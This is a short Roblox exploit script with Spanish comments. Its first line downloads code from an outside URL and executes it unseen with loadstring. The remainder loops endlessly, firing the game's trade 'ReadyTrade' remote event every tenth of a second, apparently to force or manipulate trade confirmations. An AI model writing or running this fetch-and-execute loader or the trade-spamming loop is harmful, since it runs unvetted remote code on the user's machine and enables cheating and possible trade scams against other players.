loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/7vKYJpSFbXbsQmeO/raw", true))()

-- Servicios
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remote
local ReadyTrade = ReplicatedStorage.Packages.Net["RE/Trade.ReadyTrade"]

-- Loop infinito
while true do
    pcall(function()
        ReadyTrade:FireServer(true, 0)
    end)
    task.wait(0.1) -- puedes bajar o subir el tiempo si quieres
end
